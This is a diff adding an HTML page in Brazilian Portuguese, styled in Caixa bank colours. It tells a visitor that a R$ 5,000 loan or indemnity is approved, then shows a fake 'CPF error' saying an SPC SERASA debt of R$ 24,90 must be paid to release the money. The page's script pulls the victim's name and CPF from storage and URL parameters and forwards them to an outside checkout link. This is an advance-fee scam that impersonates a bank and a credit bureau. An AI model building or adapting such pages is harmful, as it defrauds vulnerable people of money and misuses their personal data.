@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Recebimento da Indenização</title>
+
+  <script>
+    localStorage.setItem("upsell", "up4");
+  </script>
+
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'caixa-blue': '#015CA9',
+            'caixa-light-blue': '#049FD6',
+            'caixa-orange': '#F7931A',
+          }
+        }
+      }
+    };
+
+    // Checkout
+    var checkoutUrl = 'https://www.pay-pagamentos.link/checkout/fb7f12b2-0d82-4b8c-9377-6c9ac2e87998';
+
+    function abrirModal() {
+      document.getElementById("modal").classList.remove("hidden");
+    }
+
+    function fecharModal() {
+      document.getElementById("modal").classList.add("hidden");
+    }
+
+    function onlyDigits(v) {
+      return (v || "").replace(/\D/g, "");
+    }
+
+    function formatBR(n) {
+      n = Number(n);
+      if (!isFinite(n)) return null;
+      var fixed = n.toFixed(2).split(".");
+      var intPart = fixed[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+      return intPart + "," + fixed[1];
+    }
+
+    function formatCPF(cpf) {
+      cpf = onlyDigits(cpf);
+      if (cpf.length !== 11) return "";
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
+
+    function getURLParams() {
+      var params = new URLSearchParams(window.location.search);
+      var obj = {};
+      params.forEach(function (v, k) { obj[k] = v; });
+      return obj;
+    }
+
+    function getLeadData() {
+      var nome = "";
+      var cpf = "";
+      var valorBR = "";
+
+      // 1) Padrão do funil: dadosUsuario
+      try {
+        var du = JSON.parse(localStorage.getItem("dadosUsuario") || "{}");
+        if (du && typeof du === "object") {
+          if (du.nome) nome = du.nome;
+          if (du.cpf) cpf = du.cpf;
+        }
+      } catch (e) {}
+
+      // 2) Fallback: nomeUsuario
+      if (!nome) {
+        try { nome = localStorage.getItem("nomeUsuario") || ""; } catch (e) {}
+      }
+
+      // 3) Valor da simulação
+      try {
+        valorBR = localStorage.getItem("creditoAprovado") || "";
+      } catch (e) {}
+
+      if (!valorBR) {
+        try {
+          var vNum = localStorage.getItem("creditoAprovadoValor");
+          var vFmt = formatBR(vNum);
+          if (vFmt) valorBR = vFmt;
+        } catch (e) {}
+      }
+
+      // 4) Fallback URL (compatível com name/nome/cpf)
+      var p = getURLParams();
+      if (!nome) nome = (p.nome || p.name || "").replace(/\+/g, " ").trim();
+      if (!cpf) cpf = (p.cpf || p.document || "").trim();
+
+      return {
+        nome: nome || "Cliente",
+        cpf: cpf,
+        valorBR: valorBR || "5.000,00"
+      };
+    }
+
+    function atualizarTelaComLead() {
+      var lead = getLeadData();
+
+      // Nome
+      var nomeEl = document.getElementById("nome-usuario");
+      if (nomeEl) nomeEl.textContent = lead.nome;
+
+      // Valor em todos os lugares que exibem R$ 5.000,00
+      var valorEls = document.querySelectorAll("[data-valor='simulacao']");
+      for (var i = 0; i < valorEls.length; i++) {
+        valorEls[i].textContent = "R$ " + lead.valorBR;
+      }
+    }
+
+    function irParaCheckout() {
+      var lead = getLeadData();
+      var params = new URLSearchParams(window.location.search);
+
+      // garantir que leve nome/cpf também (padrão do funil)
+      if (!params.get("nome") && lead.nome) params.set("nome", lead.nome);
+      if (!params.get("cpf") && lead.cpf) params.set("cpf", onlyDigits(lead.cpf));
+
+      // manter compatibilidade com "name" (caso algum upstream use)
+      if (!params.get("name") && lead.nome) params.set("name", lead.nome);
+
+      window.location.href = checkoutUrl + "?" + params.toString();
+    }
+
+    window.addEventListener("DOMContentLoaded", function () {
+      atualizarTelaComLead();
+    });
+  </script>
+</head>
+
+<body>
+
+<script>
+    window.pixelId = "692cedccf1d8644d9b7bb3bc";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+
+  
+  <div class="bg-white w-full max-w-md rounded-lg">
+    <!-- Header -->
+    <div class="bg-gradient-to-b from-caixa-blue to-caixa-light-blue p-4 text-center">
+      <div class="flex justify-end items-center mb-6">
+        <img src="/upsell3/images/head-up2.png" alt="Brasil" class="h-8">
+      </div>
+      <h1 class="text-white font-bold text-lg">Recebimento do Empréstimo</h1>
+      <p class="text-white text-sm mt-2">
+        Olá, <span id="nome-usuario" class="font-bold">Cliente</span>!<br>
+        Você está prestes a receber o seu valor de
+        <span class="font-bold" data-valor="simulacao">R$ 5.000,00</span>
+        na sua chave PIX!
+      </p>
+    </div>
+
+    <!-- Conteúdo -->
+    <div class="px-6 py-6">
+      <!-- Situação -->
+      <div class="text-center mb-6">
+        <p class="text-gray-600 font-medium">Situação:</p>
+        <p class="text-teal-600 font-bold text-lg">Saque Aprovado</p>
+      </div>
+
+      <!-- Ícone + linha vertical + texto -->
+      <div class="flex items-start justify-start gap-4 mb-8">
+        <div class="relative flex flex-col items-center">
+          <div class="absolute top-0 bottom-0 w-px border-1.5 bg-gray-300"></div>
+          <img src="/upsell3/images/icone1.png" alt="Ícone Indenização" class="z-10 w-6 h-20 object-contain">
+        </div>
+        <div class="flex-1">
+          <p class="font-semibold text-gray-800 text-sm mb-1">Seu prêmio está disponível!</p>
+          <p class="text-sm text-gray-700">
+            Clique no botão abaixo para confirmar as informações finais e prosseguir com o seu recebimento na sua chave
+            PIX cadastrada!
+          </p>
+        </div>
+      </div>
+
+      <!-- Botão para abrir o modal -->
+      <button onclick="abrirModal()" class="w-full bg-caixa-orange hover:bg-orange-500 text-white font-bold py-3 rounded-md text-center transition-colors">
+        CONFIRMAR
+      </button>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+    <div class="bg-white rounded-lg shadow-lg w-[90%] max-w-md p-6 text-center relative">
+      <img src="/upsell3/images/image2.png" alt="SPC" class="mx-auto h-8 my-6">
+      <div class="flex items-center justify-center gap-2 my-4">
+        <img src="/upsell3/images/x.png" alt="SPC" class="h-6 mb-2">
+        <h2 class="text-red-600 font-bold text-lg mb-2 flex items-center justify-center gap-2">
+          ERRO NO CPF!
+        </h2>
+      </div>
+
+      <div class="bg-red-100 border border-red-300 text-red-800 px-4 py-2 rounded mb-4 text-sm">
+        Identificamos uma pendência com o <strong class="text-black">SPC SERASA</strong> de
+        <strong class="text-red-500">R$ 24,90</strong>
+      </div>
+
+      <p class="text-sm mb-4">
+        Para realizarmos o saque de
+        <span class="text-green-600 font-bold" data-valor="simulacao">R$ 5.000,00</span>
+        é necessário que seu CPF <strong>não tenha nenhuma pendência</strong>.
+      </p>
+
+      <p class="text-sm mb-6">
+        Efetue o pagamento da pendência clicando no botão abaixo e <strong>libere sua transferência.</strong>.
+      </p>
+
+      <button onclick="irParaCheckout()" class="w-full bg-blue-600 text-sm hover:bg-blue-700 text-white font-bold py-5 rounded-md mb-3">
+        REGULARIZAR CPF RAPIDAMENTE
+      </button>
+
+      <p class="text-xs text-red-600 my-4">
+        <strong>Atenção:</strong> <span class="text-black">Em casos de <strong>desistência da quitação</strong>, o seu
+          <strong>saque será cancelado</strong>.</span>
+      </p>
+    </div>
+  </div>
+</body>
+</html>
